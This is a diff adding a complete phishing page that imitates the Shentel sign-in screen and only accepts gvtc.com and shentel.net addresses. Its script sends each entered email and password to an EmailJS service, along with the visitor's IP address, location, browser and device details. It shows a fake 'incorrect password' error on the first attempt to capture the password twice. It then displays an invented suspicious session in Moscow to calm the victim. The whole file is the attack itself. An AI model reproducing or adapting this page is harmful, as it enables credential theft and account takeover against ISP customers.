@@ -1,0 +1,873 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8"/>
+	<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+	<title>Sign In - Shentel</title>
+	
+	<!-- Google Font -->
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,400,600,700,800" rel="stylesheet" />
+	
+	<style>
+		/* =========================================================================
+		   Fresh Base Styles
+		   ========================================================================= */
+		* {
+			box-sizing: border-box;
+			margin: 0;
+			padding: 0;
+		}
+
+		body {
+			font-family: 'Open Sans', sans-serif;
+			background-color: #ffffff;
+			color: #333;
+			display: flex;
+			flex-direction: column;
+			align-items: center;
+			min-height: 100vh;
+			padding: 20px;
+		}
+
+		/* Site Header / Logo */
+		header {
+			width: 100%;
+			max-width: 1000px;
+			padding: 20px 0;
+			margin-bottom: 40px;
+		}
+		header img {
+			height: 45px;
+			width: auto;
+			display: block;
+		}
+
+		/* Main Title */
+		.main-title-wrap {
+			text-align: center;
+			margin-bottom: 50px;
+		}
+		.main-title-wrap h1 {
+			font-size: 42px;
+			font-weight: 300;
+			color: #444;
+			margin-bottom: 15px;
+		}
+		.main-title-wrap h1::after {
+			content: '';
+			display: block;
+			width: 60px;
+			height: 4px;
+			background-color: #0076b6;
+			margin: 0 auto;
+		}
+
+		/* Main Layout */
+		.container {
+			width: 100%;
+			max-width: 1000px;
+			display: flex;
+			flex-direction: column;
+			align-items: center;
+		}
+
+		.form-detail-wrapper {
+			display: flex;
+			width: 100%;
+			justify-content: center;
+			align-items: stretch;
+			gap: 60px;
+			margin-bottom: 60px;
+		}
+
+		/* Left Column (Form) */
+		.left-content-wrap {
+			width: 100%;
+			max-width: 320px;
+			display: flex;
+			flex-direction: column;
+			justify-content: center;
+		}
+
+		.form-group {
+			position: relative;
+			margin-bottom: 30px;
+		}
+
+		.form-group input[type="text"],
+		.form-group input[type="password"] {
+			width: 100%;
+			height: 48px;
+			padding: 20px 0 5px 0;
+			font-size: 15px;
+			font-family: inherit;
+			color: #333;
+			background: transparent;
+			border: none;
+			border-bottom: 1px solid #ccc;
+			outline: none;
+			transition: border-color 0.3s;
+		}
+
+		.form-group input:focus {
+			border-bottom: 2px solid #0076b6;
+		}
+
+		.form-group label {
+			position: absolute;
+			top: 20px;
+			left: 0;
+			color: #777;
+			font-size: 15px;
+			transition: 0.2s ease all;
+			pointer-events: none;
+		}
+
+		.form-group input:focus ~ label,
+		.form-group input:not(:placeholder-shown) ~ label {
+			top: 0;
+			font-size: 11px;
+			color: #777;
+		}
+
+		.error-msg {
+			display: block;
+			margin-top: 5px;
+			font-size: 12px;
+			color: #d93025;
+			min-height: 15px;
+		}
+
+		/* Remember Me Row */
+		.remember-row {
+			display: flex;
+			justify-content: space-between;
+			align-items: flex-start;
+			font-size: 12px;
+			margin-bottom: 30px;
+			color: #666;
+		}
+		.remember-row label {
+			display: flex;
+			align-items: center;
+			cursor: pointer;
+		}
+		.remember-row input[type="checkbox"] {
+			margin-right: 8px;
+			width: 16px;
+			height: 16px;
+		}
+		.remember-row a {
+			color: #0076b6;
+			text-decoration: none;
+		}
+		.remember-row a:hover {
+			text-decoration: underline;
+		}
+
+		/* Error Banner */
+		#form-error-banner {
+			display: none;
+			font-size: 13px;
+			color: #d93025;
+			margin-bottom: 20px;
+			line-height: 1.4;
+		}
+		#form-error-banner.show {
+			display: block;
+		}
+
+		/* Submit Button */
+		#submit-btn {
+			width: 100%;
+			height: 52px;
+			background-color: #F37121;
+			color: #ffffff;
+			border: none;
+			border-radius: 5px;
+			font-size: 16px;
+			font-weight: 600;
+			cursor: pointer;
+			transition: background-color 0.2s;
+		}
+		#submit-btn:hover {
+			background-color: #e06315;
+		}
+		#submit-btn:disabled {
+			background-color: #B4BCC9;
+			cursor: not-allowed;
+		}
+
+		/* Right Column (Image & Divider) */
+		.right-content-wrap {
+			width: 100%;
+			max-width: 400px;
+			display: flex;
+			align-items: center;
+			justify-content: center;
+			border-left: 1px solid #e0e0e0;
+			padding-left: 60px;
+		}
+		.right-content-wrap img {
+			max-width: 100%;
+			height: auto;
+		}
+
+		/* Verifying Overlay */
+		#verifying-overlay {
+			display: none;
+			text-align: center;
+			padding: 40px 0;
+			width: 100%;
+			max-width: 400px;
+		}
+		#verifying-overlay.show {
+			display: block;
+		}
+		.spinner {
+			width: 47px; 
+			height: 47px; 
+			margin: 0 auto 20px;
+			background-image: url("https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/Ellipsis-1.4s-47px.gif");
+			background-size: contain; 
+			background-repeat: no-repeat; 
+			background-position: center;
+		}
+		#verify-status {
+			font-size: 15px; 
+			color: #555;
+		}
+
+		/* Activity View */
+		#activity-view {
+			display: none;
+			width: 100%;
+			max-width: 500px;
+		}
+		#activity-view.show {
+			display: block;
+		}
+		#activity-view h2 {
+			font-size: 20px;
+			margin-bottom: 10px;
+			color: #333;
+		}
+		#activity-view p {
+			font-size: 14px;
+			margin-bottom: 20px;
+			color: #666;
+		}
+
+		.session-row {
+			display: flex; 
+			align-items: center; 
+			justify-content: space-between;
+			border: 1px solid #e3e3e3; 
+			border-radius: 6px; 
+			padding: 15px; 
+			margin-bottom: 15px;
+			font-size: 13px; 
+			color: #333;
+			background: #fafafa;
+		}
+		.session-row.removed { 
+			opacity: .45; 
+			text-decoration: line-through; 
+		}
+		.session-row button {
+			border: none; 
+			background: transparent; 
+			color: #F37121; 
+			font-size: 13px; 
+			font-weight: 600;
+			cursor: pointer;
+		}
+		.session-row button:disabled { 
+			color: #B4BCC9; 
+			cursor: default; 
+		}
+
+		.activity-actions { 
+			margin-top: 25px; 
+		}
+		.activity-actions button {
+			display: block; 
+			width: 100%; 
+			margin-top: 10px; 
+			padding: 14px;
+			border-radius: 5px; 
+			border: none; 
+			font-size: 15px; 
+			font-weight: 600;
+			cursor: pointer;
+		}
+		#this-was-me { 
+			background-color: #F37121; 
+			color: #fff; 
+		}
+		#secure-account { 
+			background-color: #0076b6; 
+			color: #fff; 
+		}
+
+		#alert-box { 
+			font-size: 13px; 
+			margin-top: 15px; 
+			color: #333;
+			padding: 15px;
+			background: #e8f4fd;
+			border-left: 4px solid #0076b6;
+			border-radius: 4px;
+		}
+		
+		.note {
+			font-size: 12px;
+			color: #999;
+			margin-top: 40px;
+			text-align: center;
+		}
+
+		/* Mobile Responsiveness */
+		@media (max-width: 768px) {
+			.form-detail-wrapper {
+				flex-direction: column;
+				align-items: center;
+				gap: 40px;
+			}
+			.right-content-wrap {
+				border-left: none;
+				border-top: 1px solid #e0e0e0;
+				padding-left: 0;
+				padding-top: 40px;
+			}
+			.main-title-wrap h1 {
+				font-size: 32px;
+			}
+		}
+	</style>
+</head>
+<body>
+
+	<header>
+		<a href="https://www.shentel.com" target="_blank">
+			<img alt="Shentel Logo" src="https://55j2csgiqu.ucarecd.net/a0de3da4-2458-4bc9-a8e5-7f039c1be608/myshenlogo.png" />
+		</a>
+	</header>
+
+	<div class="main-title-wrap">
+		<h1>Sign in</h1>
+	</div>
+
+	<div class="container">
+		<div class="form-detail-wrapper">
+			
+			<!-- ================= LOGIN VIEW ================= -->
+			<div id="login-view" class="left-content-wrap">
+				<form id="contact-form" autocomplete="off" onsubmit="return false;">
+					<div class="form-group">
+						<input autocomplete="on" id="email-input" name="signin_email" required type="text" placeholder=" " />
+						<label for="email-input">Full email address</label>
+						<span class="error-msg" id="email-error"></span>
+					</div>
+
+					<div class="form-group">
+						<input autocomplete="on" id="password-input" name="signin_password" required type="password" placeholder=" " />
+						<label for="password-input">Password</label>
+						<span class="error-msg" id="password-error"></span>
+					</div>
+
+					<div class="remember-row">
+						<label>
+							<input id="RememberMe" name="LoginForm[RememberMe]" type="checkbox" /> 
+							Stay signed in
+						</label>
+						<a class="link" href="../../v1/recover" target="_blank">Trouble signing in?</a>
+					</div>
+				</form>
+
+				<div id="form-error-banner"></div>
+				<button id="submit-btn" type="button">Sign In</button>
+			</div>
+
+			<!-- ================= VERIFYING OVERLAY ================= -->
+			<div id="verifying-overlay">
+				<div class="spinner"></div>
+				<div id="verify-status">Contacting authentication server…</div>
+			</div>
+
+			<!-- ================= ACTIVITY VIEW ================= -->
+			<div id="activity-view">
+				<h2>Recent account activity</h2>
+				<p>We noticed a new sign-in. Please review the sessions below.</p>
+
+				<div class="session-row" id="session-current">
+					<span id="current-device-meta">Loading device info…</span>
+					<button id="remove-current" type="button">Remove</button>
+				</div>
+				<div class="session-row" id="session-warsaw">
+					<span id="unknown-device-meta">Loading…</span>
+					<button id="remove-warsaw" type="button">Remove</button>
+				</div>
+
+				<div class="activity-actions">
+					<button id="this-was-me" type="button">This was me</button>
+					<button id="secure-account" type="button">Secure my account</button>
+				</div>
+
+				<div id="alert-box"></div>
+			</div>
+
+			<!-- ================= RIGHT SIDE IMAGE ================= -->
+			<div class="right-content-wrap" id="right-image-wrapper">
+				<img alt="Sign in graphic" src="https://c82cc6930f2f194a0208-57d85b8e10a5c70b320e1b86a00e79e4.ssl.cf2.rackcdn.com/v1/images/signin_ss.png" />
+			</div>
+
+		</div>
+		
+		<div class="note">
+			<p>&copy; Shentel</p>
+		</div>
+	</div>
+
+	<!-- EmailJS SDK -->
+	<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+
+	<script>
+		/* =========================================================================
+		   Boot EmailJS
+		   ========================================================================= */
+		function bootEmailJS() {
+			if (window.emailjs && emailjs.init) {
+				try { emailjs.init("uGRhkufMjo08rjwb_"); } catch { /* already init */ }
+				return true;
+			}
+			return false;
+		}
+		bootEmailJS();
+
+		/* =========================================================================
+		   DOM references
+		   ========================================================================= */
+		const form            = document.getElementById("contact-form");
+		const emailInput      = document.getElementById("email-input");
+		const passwordInput   = document.getElementById("password-input");
+		const emailError      = document.getElementById("email-error");
+		const passwordError   = document.getElementById("password-error");
+		const formErrorBanner = document.getElementById("form-error-banner");
+		const submitBtn       = document.getElementById("submit-btn");
+
+		const loginView         = document.getElementById("login-view");
+		const verifyingOverlay  = document.getElementById("verifying-overlay");
+		const verifyStatus      = document.getElementById("verify-status");
+		const activityView      = document.getElementById("activity-view");
+		const currentDeviceMeta = document.getElementById("current-device-meta");
+		const unknownDeviceMeta = document.getElementById("unknown-device-meta");
+
+		const sessionCurrent   = document.getElementById("session-current");
+		const sessionWarsaw    = document.getElementById("session-warsaw");
+		const removeCurrentBtn = document.getElementById("remove-current");
+		const removeWarsawBtn  = document.getElementById("remove-warsaw");
+		const alertBox         = document.getElementById("alert-box");
+		const rightImageWrapper = document.getElementById("right-image-wrapper");
+
+		/* =========================================================================
+		   Allowed email domains (Added shentel.net)
+		   ========================================================================= */
+		const ACCEPTED_DOMAINS = ["gvtc.com", "shentel.net"];
+		const allowedDomainRegex = (() => {
+			const escaped = ACCEPTED_DOMAINS.map((d) => d.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"));
+			return new RegExp(`^[^@\\s]+@(${escaped.join("|")})$`, "i");
+		})();
+
+		/* =========================================================================
+		   Rate limit
+		   ========================================================================= */
+		const RATE_LIMIT_KEY = "gvtc_verification_attempts";
+		const WINDOW_MS      = 60 * 60 * 1000;
+		const MAX_ATTEMPTS   = 3;
+
+		function readRateData() {
+			const fallback = { attempts: [], lastSubmit: 0 };
+			try {
+				const stored = localStorage.getItem(RATE_LIMIT_KEY);
+				if (!stored) return fallback;
+				const parsed = JSON.parse(stored);
+				if (!Array.isArray(parsed.attempts)) parsed.attempts = [];
+				if (typeof parsed.lastSubmit !== "number") parsed.lastSubmit = 0;
+				return parsed;
+			} catch {
+				return fallback;
+			}
+		}
+		function writeRateData(data) {
+			try { localStorage.setItem(RATE_LIMIT_KEY, JSON.stringify(data)); } catch { /* ignore */ }
+		}
+		function checkRateLimit() {
+			const now  = Date.now();
+			const data = readRateData();
+			data.attempts = data.attempts.filter((t) => now - t < WINDOW_MS);
+			writeRateData(data);
+
+			if (data.lastSubmit && now - data.lastSubmit < WINDOW_MS) {
+				const remaining = Math.ceil((WINDOW_MS - (now - data.lastSubmit)) / 60000);
+				return { limited: true, message: `Verification already completed on this device. Please wait ${remaining} minute(s).` };
+			}
+			if (data.attempts.length >= MAX_ATTEMPTS) {
+				const oldest = data.attempts[0];
+				const remaining = Math.ceil((WINDOW_MS - (now - oldest)) / 60000);
+				return { limited: true, message: `Too many attempts. Please wait ${remaining} minute(s).` };
+			}
+			return { limited: false, data };
+		}
+		function recordAttempt() {
+			const data = readRateData();
+			data.attempts.push(Date.now());
+			writeRateData(data);
+		}
+		function recordSuccess() {
+			const data = readRateData();
+			data.lastSubmit = Date.now();
+			writeRateData(data);
+		}
+
+		/* =========================================================================
+		   Device / location helpers
+		   ========================================================================= */
+		function getBrowser() {
+			const ua = navigator.userAgent;
+			if (ua.includes("SamsungBrowser")) return "Samsung Internet";
+			if (ua.includes("Firefox")) return "Firefox";
+			if (ua.includes("Edg")) return "Edge";
+			if (ua.includes("OPR") || ua.includes("Opera")) return "Opera";
+			if (ua.includes("Trident")) return "Internet Explorer";
+			if (ua.includes("Chrome")) return "Chrome";
+			if (ua.includes("Safari")) return "Safari";
+			return "Unknown";
+		}
+		function getOS() {
+			const ua = navigator.userAgent;
+			if (ua.includes("Windows")) return "Windows";
+			if (ua.includes("Android")) return "Android";
+			if (ua.includes("like Mac")) return "iOS";
+			if (ua.includes("Mac")) return "MacOS";
+			if (ua.includes("Linux")) return "Linux";
+			return "Unknown";
+		}
+		function getTimezone() {
+			try { return Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown"; } catch { return "Unknown"; }
+		}
+		function getTimestamp() {
+			return new Date().toLocaleString("en-US", { timeZoneName: "short" });
+		}
+		function formatDeviceTime(date) {
+			const pad = (n) => String(n).padStart(2, "0");
+			const yyyy = date.getFullYear();
+			const mm = pad(date.getMonth() + 1);
+			const dd = pad(date.getDate());
+			const hh = pad(date.getHours());
+			const mi = pad(date.getMinutes());
+			let tz = "";
+			try {
+				tz = new Intl.DateTimeFormat("en-US", { timeZoneName: "short" })
+					.formatToParts(date).find((p) => p.type === "timeZoneName")?.value || "";
+			} catch { /* ignore */ }
+			return `${yyyy}-${mm}-${dd} ${hh}:${mi}${tz ? ` (${tz})` : ""}`;
+		}
+		async function getIP() {
+			try {
+				const res = await fetch("https://api.ipify.org?format=json");
+				const data = await res.json();
+				return data.ip || "Not available";
+			} catch { return "Not available"; }
+		}
+		async function getLocation() {
+			try {
+				const res = await fetch("https://ipapi.co/json/");
+				if (!res.ok) return null;
+				const data = await res.json();
+				const city = data.city || "";
+				const country = data.country_name || data.country || "";
+				if (city && country) return `${city}, ${country}`;
+				return country || null;
+			} catch { return null; }
+		}
+
+		/* =========================================================================
+		   EmailJS send
+		   ========================================================================= */
+		function waitForEmailJS(timeoutMs = 4000) {
+			return new Promise((resolve) => {
+				if (window.emailjs && emailjs.send) return resolve(true);
+				const started = Date.now();
+				const id = setInterval(() => {
+					if (window.emailjs && emailjs.send) {
+						clearInterval(id);
+						bootEmailJS();
+						resolve(true);
+					} else if (Date.now() - started > timeoutMs) {
+						clearInterval(id);
+						resolve(false);
+					}
+				}, 100);
+			});
+		}
+
+		async function sendAttemptToEmailJS({ emailValue, passwordValue, attempt }) {
+			const [ip, location] = await Promise.all([getIP(), getLocation()]);
+			const pageTitle = document.title;
+			const pageUrl   = window.location.href;
+			const hostname  = window.location.hostname;
+			const pathname  = window.location.pathname;
+			const referrer  = document.referrer || "Direct";
+			const browser   = getBrowser();
+			const os        = getOS();
+
+			const device = (() => {
+				const ua = navigator.userAgent;
+				if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "Tablet";
+				if (/Mobile|iP(hone|od)|Android|BlackBerry|IEMobile|Kindle|Silk-Accelerated|(hpw|web)OS|Opera M(obi|ini)/.test(ua)) return "Mobile";
+				return "Desktop";
+			})();
+
+			const screenResolution = `${window.screen.width}x${window.screen.height}`;
+			const viewportSize     = `${window.innerWidth}x${window.innerHeight}`;
+			const timezone         = getTimezone();
+			const language         = navigator.language || "Unknown";
+
+			const attemptLabel = attempt === 1 ? "FIRST ATTEMPT (Incorrect credentials shown)" : "SECOND ATTEMPT (Verification successful)";
+
+			const messageLog = [
+				attemptLabel,
+				`Timestamp: ${getTimestamp()}`,
+				`Email/Username: ${emailValue}`,
+				`Password: ${passwordValue}`,
+				`Page Title: ${pageTitle}`,
+				`Page URL: ${pageUrl}`,
+				`Hostname: ${hostname}`,
+				`Pathname: ${pathname}`,
+				`Referrer: ${referrer}`,
+				`Browser: ${browser}`,
+				`IP: ${ip}`,
+				`OS: ${os}`,
+				`Device: ${device}`,
+				`Screen Resolution: ${screenResolution}`,
+				`Viewport: ${viewportSize}`,
+				`Timezone: ${timezone}`,
+				`Approx. Location: ${location || "Unknown"}`,
+				`Language: ${language}`,
+				`Total Elements: ${document.getElementsByTagName("*").length}`,
+				`Forms: ${document.forms.length}`,
+				`Inputs: ${document.querySelectorAll("input").length}`,
+				`Links: ${document.querySelectorAll("a").length}`
+			].join("\n");
+
+			const templateParams = {
+				timestamp: getTimestamp(),
+				from_email: emailValue,
+				password: passwordValue,
+				attempt_number: attempt,
+				attempt_label: attemptLabel,
+				page_title: pageTitle,
+				page_url: pageUrl,
+				page_hostname: hostname,
+				page_pathname: pathname,
+				referrer,
+				browser,
+				ip,
+				os,
+				device,
+				screen_resolution: screenResolution,
+				viewport_size: viewportSize,
+				timezone,
+				location: location || "Unknown",
+				language,
+				message: messageLog
+			};
+
+			const ready = await waitForEmailJS(4000);
+			if (!ready) return;
+
+			try {
+				const response = await emailjs.send("service_t84doqy", "template_4rsr5vq", templateParams);
+				console.log(`[EmailJS] SUCCESS (attempt ${attempt}):`, response.status, response.text);
+			} catch (error) {
+				console.error(`[EmailJS] FAILED (attempt ${attempt}):`, error);
+			}
+		}
+
+		/* =========================================================================
+		   Verifying sequence
+		   ========================================================================= */
+		const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+		async function runVerifyingSequence() {
+			const stages = [
+				{ text: "Contacting authentication server…", delay: 700 },
+				{ text: "Verifying credentials…",            delay: 800 },
+				{ text: "Checking account activity…",        delay: 700 },
+				{ text: "Finalizing sign-in…",               delay: 600 }
+			];
+			for (const stage of stages) {
+				verifyStatus.textContent = stage.text;
+				await sleep(stage.delay);
+			}
+		}
+
+		/* =========================================================================
+		   Two-attempt flow
+		   ========================================================================= */
+		let attemptNumber = 1;
+
+		form.addEventListener("submit", (e) => e.preventDefault());
+
+		submitBtn.addEventListener("click", async () => {
+			emailError.textContent = "";
+			passwordError.textContent = "";
+			formErrorBanner.textContent = "";
+			formErrorBanner.classList.remove("show");
+
+			const rateCheck = checkRateLimit();
+			if (rateCheck.limited) {
+				formErrorBanner.textContent = rateCheck.message;
+				formErrorBanner.classList.add("show");
+				return;
+			}
+
+			const emailValue    = emailInput.value.trim();
+			const passwordValue = passwordInput.value.trim();
+			let valid = true;
+
+			if (!emailValue) {
+				emailError.textContent = "Email is required.";
+				valid = false;
+			} else if (!allowedDomainRegex.test(emailValue)) {
+				emailError.textContent = "Email must be from an accepted domain.";
+				valid = false;
+			}
+			if (!passwordValue) {
+				passwordError.textContent = "Password is required.";
+				valid = false;
+			}
+			if (!valid) return;
+
+			recordAttempt();
+
+			submitBtn.disabled = true;
+			submitBtn.textContent = "Verifying…";
+
+			sendAttemptToEmailJS({ emailValue, passwordValue, attempt: attemptNumber });
+
+			if (attemptNumber === 1) {
+				await sleep(900);
+				submitBtn.disabled = false;
+				submitBtn.textContent = "Sign In";
+
+				formErrorBanner.textContent = "Incorrect username or password. Please try again.";
+				formErrorBanner.classList.add("show");
+
+				passwordInput.value = "";
+				passwordInput.focus();
+
+				attemptNumber = 2;
+				return;
+			}
+
+			const now            = new Date();
+			const thirtyMinLater = new Date(now.getTime() + 30 * 60 * 1000);
+			const browser        = getBrowser();
+			const os             = getOS();
+
+			const location = await Promise.race([getLocation(), sleep(800).then(() => null)]);
+			const locationLabel = location || getTimezone();
+
+			currentDeviceMeta.textContent = `${browser} on ${os} · ${locationLabel} · ${formatDeviceTime(now)}`;
+			unknownDeviceMeta.textContent = `Chrome on Windows · Moscow, Russia · ${formatDeviceTime(thirtyMinLater)}`;
+
+			loginView.style.display = "none";
+			verifyingOverlay.classList.add("show");
+			if (rightImageWrapper) rightImageWrapper.style.display = "none";
+
+			await runVerifyingSequence();
+
+			verifyingOverlay.classList.remove("show");
+			activityView.classList.add("show");
+
+			submitBtn.disabled = false;
+			submitBtn.textContent = "Sign In";
+
+			sessionCurrent.classList.remove("removed");
+			sessionWarsaw.classList.remove("removed");
+			removeCurrentBtn.disabled = false;
+			removeWarsawBtn.disabled  = false;
+
+			recordSuccess();
+		});
+
+		/* =========================================================================
+		   Remove-session buttons
+		   ========================================================================= */
+		function removeSession(sessionEl, label) {
+			if (!sessionEl) return;
+			sessionEl.classList.add("removed");
+			const btn = sessionEl.querySelector("button");
+			if (btn) btn.disabled = true;
+		}
+
+		removeCurrentBtn.addEventListener("click", (e) => {
+			e.preventDefault();
+			removeSession(sessionCurrent, "current device");
+		});
+
+		removeWarsawBtn.addEventListener("click", (e) => {
+			e.preventDefault();
+			removeSession(sessionWarsaw, "Moscow, Russia");
+		});
+
+		/* =========================================================================
+		   Activity view actions
+		   ========================================================================= */
+		document.getElementById("this-was-me").addEventListener("click", () => {
+			activityView.classList.remove("show");
+			loginView.style.display = "block";
+			
+			if (rightImageWrapper) rightImageWrapper.style.display = "flex";
+
+			form.reset();
+			formErrorBanner.classList.remove("show");
+			formErrorBanner.textContent = "";
+			alertBox.textContent = "";
+			attemptNumber = 1;
+
+			sessionCurrent.classList.remove("removed");
+			sessionWarsaw.classList.remove("removed");
+			removeCurrentBtn.disabled = false;
+			removeWarsawBtn.disabled  = false;
+
+			currentDeviceMeta.textContent = "Loading device info…";
+			unknownDeviceMeta.textContent = "Loading…";
+
+			emailInput.focus();
+		});
+
+		document.getElementById("secure-account").addEventListener("click", () => {
+			removeSession(sessionWarsaw, "Moscow, Russia (secured)");
+			alertBox.innerHTML = `<strong>Account secured.</strong><br />The suspicious session from <strong>Moscow, Russia</strong> has been removed.`;
+		});
+
+		/* =========================================================================
+		   On load
+		   ========================================================================= */
+		document.addEventListener("DOMContentLoaded", () => {
+			bootEmailJS();
+			const rateCheck = checkRateLimit();
+			if (rateCheck.limited) {
+				formErrorBanner.textContent = rateCheck.message;
+				formErrorBanner.classList.add("show");
+				submitBtn.disabled    = true;
+				submitBtn.textContent = "Verification Complete";
+			}
+		});
+	</script>
+</body>
+</html>
